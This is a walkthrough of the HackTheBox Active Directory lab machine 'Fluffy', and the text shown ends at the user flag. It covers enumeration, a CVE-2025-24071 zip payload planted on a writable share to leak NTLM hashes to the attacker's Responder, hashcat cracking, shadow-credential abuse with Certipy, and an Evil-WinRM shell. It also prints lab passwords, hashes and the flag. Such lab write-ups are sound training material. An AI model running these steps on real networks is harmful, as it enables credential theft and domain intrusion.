# HTB-Fluffy
*Walkthrough*

<img width="862" height="793" alt="Screenshot 2025-09-20 214022" src="https://github.com/user-attachments/assets/d1bca2e3-2d89-4efb-8016-745fd33facce" />

---
## Intro
Today, the HTB challenge “Fluffy”, part of Season 8, has officially been retired. That’s why, having successfully completed it, I decided to share the steps I followed to reach the final solution, capturing both required flags.

I want to say right away that this has been one of the most interesting machines I worked on this year. At the time, I was preparing for the PJPT exam by TCM Security (which I successfully passed at the end of last month), and I needed some practice with Active Directory. This machine also had something extra to offer!
For an entry-level player like me, it wasn’t exactly easy: at first, I even thought about giving up... but then I told myself: never give up! **And here I am.**

---
## nmap
Let's start with a full nmap scan. Generally, especially for more complex machines that require more time, I open additional tabs in my terminal simultaneously to begin enumeration. A great tool that allows for an initial comprehensive enumeration is enum4linux-ng. Below are some of the results:

```bash
┌──(urielsg㉿Kali)-[~/Scrivania/FLUFFY]
└─$ nmap -sC -sV -p- -T4 10.10.11.69
Starting Nmap 7.95 ( https://nmap.org ) at 2025-05-26 00:11 CEST
Nmap scan report for 10.10.11.69
Host is up (0.12s latency).
Not shown: 65516 filtered tcp ports (no-response)
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-05-26 05:16:01Z)
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: fluffy.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC01.fluffy.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.fluffy.htb
| Not valid before: 2025-04-17T16:04:17
|_Not valid after:  2026-04-17T16:04:17
|_ssl-date: 2025-05-26T05:17:32+00:00; +6h59m59s from scanner time.
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: fluffy.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC01.fluffy.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.fluffy.htb
| Not valid before: 2025-04-17T16:04:17
|_Not valid after:  2026-04-17T16:04:17
|_ssl-date: 2025-05-26T05:17:33+00:00; +6h59m59s from scanner time.
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: fluffy.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-05-26T05:17:32+00:00; +6h59m59s from scanner time.
| ssl-cert: Subject: commonName=DC01.fluffy.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.fluffy.htb
| Not valid before: 2025-04-17T16:04:17
|_Not valid after:  2026-04-17T16:04:17
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: fluffy.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-05-26T05:17:33+00:00; +6h59m59s from scanner time.
| ssl-cert: Subject: commonName=DC01.fluffy.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.fluffy.htb
| Not valid before: 2025-04-17T16:04:17
|_Not valid after:  2026-04-17T16:04:17
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
49667/tcp open  msrpc         Microsoft Windows RPC
49677/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49678/tcp open  msrpc         Microsoft Windows RPC
49681/tcp open  msrpc         Microsoft Windows RPC
49695/tcp open  msrpc         Microsoft Windows RPC
49703/tcp open  msrpc         Microsoft Windows RPC
49732/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 6h59m58s, deviation: 0s, median: 6h59m58s
| smb2-time: 
|   date: 2025-05-26T05:16:53
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required

```

The scan confirms we're dealing with an AD environment and also reveals the domain name — `fluffy.htb` — which we had already suspected, and the DC name -  `dc01-fluffy.htb`.
We’ll go ahead and add it to our `/etc/hosts` file right away:

```bash
sudo nano /etc/hosts
```
Let's add:
```bash
10.10.11.69  fluffy.htb  dc01-fluffy.htb
```


As mentioned earlier, while Nmap was running, I started exploring other enumeration paths in parallel:

## Enum4linux-ng

```bash
┌──(urielsg㉿Kali)-[~/Scrivania/FLUFFY]
└─$ enum4linux-ng -u 'j.fleischman' -p 'J0elTHEM4n1990!' 10.10.11.69

 ====================================
|    Listener Scan on 10.10.11.69    |
 ====================================
[*] Checking LDAP
[+] LDAP is accessible on 389/tcp
[*] Checking LDAPS
[+] LDAPS is accessible on 636/tcp
[*] Checking SMB
[+] SMB is accessible on 445/tcp
[*] Checking SMB over NetBIOS
[+] SMB over NetBIOS is accessible on 139/tcp

 ==========================================================
|    Domain Information via SMB session for 10.10.11.69    |
 ==========================================================
[*] Enumerating via unauthenticated SMB session on 445/tcp
[+] Found domain information via SMB
NetBIOS computer name: DC01                                                                                                                                  
NetBIOS domain name: FLUFFY                                                                                                                                  
DNS domain: fluffy.htb                                                                                                                                       
FQDN: DC01.fluffy.htb                                                                                                                                        
Derived membership: domain member                                                                                                                            
Derived domain: FLUFFY

 ========================================
|    RPC Session Check on 10.10.11.69    |
 ========================================
[*] Check for null session
[+] Server allows session using username '', password ''
[*] Check for user session
[+] Server allows session using username 'j.fleischman', password 'J0elTHEM4n1990!'
[*] Check for random user
[+] Server allows session using username 'jgtqjkkk', password 'J0elTHEM4n1990!'
[H] Rerunning enumeration with user 'jgtqjkkk' might give more results

 ==================================================
|    Domain Information via RPC for 10.10.11.69    |
 ==================================================
[+] Domain: FLUFFY
[+] Domain SID: S-1-5-21-497550768-2797716248-2627064577
[+] Membership: domain member

 ====================================
|    Users via RPC on 10.10.11.69    |
 ====================================
[*] Enumerating users via 'querydispinfo'
[+] Found 9 user(s) via 'querydispinfo'
[*] Enumerating users via 'enumdomusers'
[+] Found 9 user(s) via 'enumdomusers'
[+] After merging user results we have 9 user(s) total:
'1103':                                                                                                                                                      
  username: ca_svc                                                                                                                                           
  name: certificate authority service                                                                                                                        
  acb: '0x00000210'                                                                                                                                          
  description: (null)                                                                                                                                        
'1104':                                                                                                                                                      
  username: ldap_svc                                                                                                                                         
  name: ldap service                                                                                                                                         
  acb: '0x00000210'                                                                                                                                          
  description: (null)                                                                                                                                        
'1601':                                                                                                                                                      
  username: p.agila                                                                                                                                          
  name: Prometheus Agila                                                                                                                                     
  acb: '0x00000210'                                                                                                                                          
  description: (null)                                                                                                                                        
'1603':                                                                                                                                                      
  username: winrm_svc                                                                                                                                        
  name: winrm service                                                                                                                                        
  acb: '0x00000210'                                                                                                                                          
  description: (null)                                                                                                                                        
'1605':                                                                                                                                                      
  username: j.coffey                                                                                                                                         
  name: John Coffey                                                                                                                                          
  acb: '0x00000210'                                                                                                                                          
  description: (null)                                                                                                                                        
'1606':                                                                                                                                                      
  username: j.fleischman                                                                                                                                     
  name: Joel Fleischman                                                                                                                                      
  acb: '0x00000210'                                                                                                                                          
  description: (null)                                                                                                                                        
'500':                                                                                                                                                       
  username: Administrator                                                                                                                                    
  name: (null)                                                                                                                                               
  acb: '0x00000210'                                                                                                                                          
  description: Built-in account for administering the computer/domain                                                                                        
'501':                                                                                                                                                       
  username: Guest                                                                                                                                            
  name: (null)                                                                                                                                               
  acb: '0x00000214'                                                                                                                                          
  description: Built-in account for guest access to the computer/domain                                                                                      
'502':                                                                                                                                                       
  username: krbtgt                                                                                                                                           
  name: (null)                                                                                                                                               
  acb: '0x00000011'                                                                                                                                          
  description: Key Distribution Center Service Account

 =====================================
|    Shares via RPC on 10.10.11.69    |
 =====================================
[*] Enumerating shares
[+] Found 6 share(s):
ADMIN$:                                                                                                                                                      
  comment: Remote Admin                                                                                                                                      
  type: Disk                                                                                                                                                 
C$:                                                                                                                                                          
  comment: Default share                                                                                                                                     
  type: Disk                                                                                                                                                 
IPC$:                                                                                                                                                        
  comment: Remote IPC                                                                                                                                        
  type: IPC                                                                                                                                                  
IT:                                                                                                                                                          
  comment: ''                                                                                                                                                
  type: Disk                                                                                                                                                 
NETLOGON:                                                                                                                                                    
  comment: Logon server share                                                                                                                                
  type: Disk                                                                                                                                                 
SYSVOL:                                                                                                                                                      
  comment: Logon server share                                                                                                                                
  type: Disk                
        
```
Using `enum4linux-ng`, we gather a lot of interesting information!

All of this gives us a solid starting point for further enumeration!

---

## SMB: A Promising Entry Point

A key service — and almost certainly our initial access point — is **SMB**.  
We’ve already extracted a long list of users and shares. Generally, shared folders on the network are among the first “doors” to open: it’s worth exploring them right away, as we might find interesting files, documents, or directories.

That’s my usual approach for CTFs: in a real-world penetration test, of course, it’s crucial to go step by step and identify **all** potential vulnerabilities.

Let's use the amazing **crackmapexec**:

```bash
┌──(urielsg㉿Kali)-[~/Scrivania/FLUFFY]
└─$ crackmapexec smb 10.10.11.69 -u j.fleischman -p J0elTHEM4n1990! --shares
SMB         10.10.11.69     445    DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:fluffy.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.69     445    DC01             [+] fluffy.htb\j.fleischman:J0elTHEM4n1990! 
SMB         10.10.11.69     445    DC01             [+] Enumerated shares
SMB         10.10.11.69     445    DC01             Share           Permissions     Remark
SMB         10.10.11.69     445    DC01             -----           -----------     ------
SMB         10.10.11.69     445    DC01             ADMIN$                          Remote Admin
SMB         10.10.11.69     445    DC01             C$                              Default share
SMB         10.10.11.69     445    DC01             IPC$            READ            Remote IPC
SMB         10.10.11.69     445    DC01             IT              READ,WRITE      
SMB         10.10.11.69     445    DC01             NETLOGON        READ            Logon server share 
SMB         10.10.11.69     445    DC01             SYSVOL          READ            Logon server share 
```

One thing that immediately stands out is an exceptionally juicy and non-“classic” share: “IT”, for which we even have write permissions in addition to read access!

Let's dive into it!

---

## IT
We proceed by accessing the IT folder, continuing with a manual exploration in search of what interests us: we absolutely need to find an entry point, a flaw, or a vulnerability…

```bash
──(urielsg㉿Kali)-[~/Scrivania/FLUFFY]
└─$ smbclient //10.10.11.69/IT -U FLUFFY/j.fleischman      
Password for [FLUFFY\j.fleischman]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Mon May 26 07:22:24 2025
  ..                                  D        0  Mon May 26 07:22:24 2025
  Everything-1.4.1.1026.x64           D        0  Fri Apr 18 17:08:44 2025
  Everything-1.4.1.1026.x64.zip       A  1827464  Fri Apr 18 17:04:05 2025
  KeePass-2.58                        D        0  Fri Apr 18 17:08:38 2025
  KeePass-2.58.zip                    A  3225346  Fri Apr 18 17:03:17 2025
  Upgrade_Notice.pdf                  A   169963  Sat May 17 16:31:07 2025

```

Our attention falls on several items. There’s a folder called “everything” (to explore), its zipped version, a KeePass database (which we often find on these machines; very often the password databases are protected with weak passwords, or we can find the password written in plain text in some file!), and a PDF file.

For simplicity and speed, I start with the PDF document:

<img width="401" height="565" alt="image" src="https://github.com/user-attachments/assets/19331f13-338b-4e04-a88c-ea3054b858aa" />

Well, I was mistaken… we didn’t just find a simple flaw. We found an actual report containing known vulnerabilities, including some critical-level ones!

Without thinking twice, I dive into a Google search, and among the results, I find a fantastic PoC related to the second CVE on the list, 2025-24071:

https://github.com/ThemeHackers/CVE-2025-24071

---

## CVE-2025-24071

I download the exploit, try to understand how it works, and then execute it:

```bash
┌──(urielsg㉿Kali)-[~/Scrivania/FLUFFY/CVE-2025-24071]
└─$ python exploit.py -h

usage: exploit.py [-h] [-f FILE_NAME] [-i IP_ADDRESS] [-afv]

Create an exploit ZIP file or show affected versions

options:
  -h, --help            show this help message and exit
  -f, --file-name FILE_NAME
                        Name of the library file (without extension)
  -i, --ip-address IP_ADDRESS
                        IP address (e.g., 192.168.1.111)
  -afv, --affected-versions
                        Display affected versions

```

```bash
┌──(urielsg㉿Kali)-[~/Scrivania/FLUFFY/CVE-2025-24071]
└─$ python exploit.py -f urielsg -i 10.10.14.65

          ______ ____    ____  _______       ___     ___    ___    _____        ___    _  _      ___    ______   __  
         /      |\   \  /   / |   ____|     |__ \   / _ \  |__ \  | ____|      |__ \  | || |    / _ \  |____  | /_ | 
        |  ,----' \   \/   /  |  |__    ______ ) | | | | |    ) | | |__    ______ ) | | || |_  | | | |     / /   | | 
        |  |       \      /   |   __|  |______/ /  | | | |   / /  |___ \  |______/ /  |__   _| | | | |    / /    | | 
        |  `----.   \    /    |  |____       / /_  | |_| |  / /_   ___) |       / /_     | |   | |_| |   / /     | | 
         \______|    \__/     |_______|     |____|  \___/  |____| |____/       |____|    |_|    \___/   /_/      |_| 
                                                
                                                
                                                Windows File Explorer Spoofing Vulnerability (CVE-2025-24071)
                    by ThemeHackers                                                                                                                                                           
    
Creating exploit with filename: urielsg.library-ms
Target IP: 10.10.14.65

Generating library file...
✓ Library file created successfully

Creating ZIP archive...
✓ ZIP file created successfully

Cleaning up temporary files...
✓ Cleanup completed

Process completed successfully!
Output file: exploit.zip
Run this file on the victim machine and you will see the effects of the vulnerability such as using ftp smb to send files etc.

```

As the script itself diligently informs us, a zip file has been created. I won’t go into the details of this vulnerability (the information is easily found online), but one thing is certain: we have the ability to upload our exploit directly into the IT folder (since we have write permissions!) and, at the same time, as instructed, we can run the legendary Responder, one of the most powerful tools in AD pentesting, in the hope of capturing a hash.

```bash
┌──(urielsg㉿Kali)-[~/Scrivania/FLUFFY/CVE-2025-24071]
└─$ smbclient //10.10.11.69/IT -U FLUFFY/j.fleischman%'J0elTHEM4n1990!'
Try "help" to get a list of possible commands.
smb: \> put exploit.zip
putting file exploit.zip as \exploit.zip (0,8 kb/s) (average 0,8 kb/s)

┌──(urielsg㉿Kali)-[~/Scrivania/FLUFFY/CVE-2025-24071]
└─$ sudo responder -I tun0 -dwv                                                                                  
                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|

           NBT-NS, LLMNR & MDNS Responder 3.1.5.0


```

...and BOOM!

```bash
[SMB] NTLMv2-SSP Client   : 10.10.11.69
[SMB] NTLMv2-SSP Username : FLUFFY\p.agila
[SMB] NTLMv2-SSP Hash     : p.agila::FLUFFY:42bed17e546933f0:FF972C9BF9217D49EBAF6BB28E6806F1:010100000000000000804986E1D2DB01F38E83FB598CD0720000000002000800320036005000540001001E00570049004E002D005A0055004B00370033004D003600430055005200530004003400570049004E002D005A0055004B00370033004D00360043005500520053002E0032003600500054002E004C004F00430041004C000300140032003600500054002E004C004F00430041004C000500140032003600500054002E004C004F00430041004C000700080000804986E1D2DB0106000400020000000800300030000000000000000100000000200000397B18E8432C99AAFFE6424E4EA3853585D4E7A96DC7E7A817D790F4D6D8B22D0A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310034002E00360035000000000000000000
```

We receive the hash of p.agila, one of the domain users. We can proceed to crack the hash using Hashcat:

```bash
┌──(urielsg㉿Kali)-[~/Scrivania/FLUFFY]
└─$ hashcat -m 5600 agila-hash.txt /usr/share/wordlists/rockyou.txt

.....34002e00360035000000000000000000:prometheusx-303
```

We now have the password: **prometheusx-303**.

---

## Bloodhound
An additional essential step in AD pentesting is without a doubt the use of BloodHound (a tool that maps Active Directory relationships and permissions to help identify attack paths in a domain).

I won’t describe the full installation process or how the tool works in this walkthrough. I’ll simply show the extremely valuable information we obtained, which, as you’ll see, will help us proceed correctly.

<img width="1309" height="521" alt="image" src="https://github.com/user-attachments/assets/2c13b992-6c8e-4a0f-adc9-a566dac0d5b7" />

<img width="1764" height="126" alt="image" src="https://github.com/user-attachments/assets/1396e48c-c3c0-4632-8a7f-88a16afba01f" />

<img width="1451" height="331" alt="image" src="https://github.com/user-attachments/assets/af9c73ab-f949-4942-9633-55338112812b" />

<img width="1382" height="531" alt="image" src="https://github.com/user-attachments/assets/302c3349-eac6-4fc5-ab2b-5d58880fd8ca" />

<img width="1235" height="167" alt="image" src="https://github.com/user-attachments/assets/14bc4ecb-c446-42a7-923b-b8c9c89c831d" />

We immediately notice the significance of this information.

We’ve pwned the user p.agila, who, due to his relationships, turns out to be a key user: he are a member of the “Service Accounts Managers” group, which has GenericAll on “Service Accounts” (which in turn has GenericWrite on the service accounts ca_svc, ldap_svc, and winrm_svc).

Having these properties (GenericAll and GenericWrite) grants a series of powerful privileges over the referenced objects — privileges that are invaluable.

After researching online, one of the emerging techniques is “Shadow Credentials” (a method to abuse certificate or key permissions in AD to impersonate users or escalate privileges). This is exactly what we will do, using the tool already present in Kali: Certipy or Certipy-AD.

---

## Shadow Credentials and First shell

We launch the attack.
(You’ll notice the use of “faketime”, necessary to handle clock skew issues that unfortunately cause problems with this attack, just as they do, for example, with Kerberoasting. Faketime is the only solution I’ve consistently found to work 100%, so I’ll stick with it.)

```bash
┌──(urielsg㉿Kali)-[~/Scaricati/bloodyAD]
└─$ faketime -f +7h certipy-ad shadow auto -u 'p.agila@fluffy.htb' -p 'prometheusx-303'  -account 'WINRM_SVC'  -dc-ip '10.10.11.69'
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Targeting user 'winrm_svc'
[*] Generating certificate
[*] Certificate generated
[*] Generating Key Credential
[*] Key Credential generated with DeviceID '75f07d53-a30e-166d-41e0-23660101fa14'
[*] Adding Key Credential with device ID '75f07d53-a30e-166d-41e0-23660101fa14' to the Key Credentials for 'winrm_svc'
[*] Successfully added Key Credential with device ID '75f07d53-a30e-166d-41e0-23660101fa14' to the Key Credentials for 'winrm_svc'
[*] Authenticating as 'winrm_svc' with the certificate
[*] Using principal: winrm_svc@fluffy.htb
[*] Trying to get TGT...
[*] Got TGT
[*] Saved credential cache to 'winrm_svc.ccache'
[*] Trying to retrieve NT hash for 'winrm_svc'
[*] Restoring the old Key Credentials for 'winrm_svc'
[*] Successfully restored the old Key Credentials for 'winrm_svc'
[*] NT hash for 'winrm_svc': 33bd09dcd697600edf6b3a7af4875767

```

The attack was successful, and we obtained the hash of winrm_svc!

The next step is obvious… Since we’re dealing with WinRM, it’s time for Evil-WinRM to enter the scene to obtain the first shell — and with it, the user flag!

```bash
┌──(urielsg㉿Kali)-[~/Scaricati/bloodyAD]
└─$ evil-winrm -i 10.10.11.69 -u 'winrm_svc' -H '33bd09dcd697600edf6b3a7af4875767'
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\winrm_svc\Documents> cd ..
*Evil-WinRM* PS C:\Users\winrm_svc> cd Desktop
*Evil-WinRM* PS C:\Users\winrm_svc\Desktop> dir


    Directory: C:\Users\winrm_svc\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-ar---        5/31/2025   9:59 AM             34 user.txt


*Evil-WinRM* PS C:\Users\winrm_svc\Desktop> cat user.txt
4aad09deb1c7bf7d90a7adff3473a18e

```

User flag obtained!

---

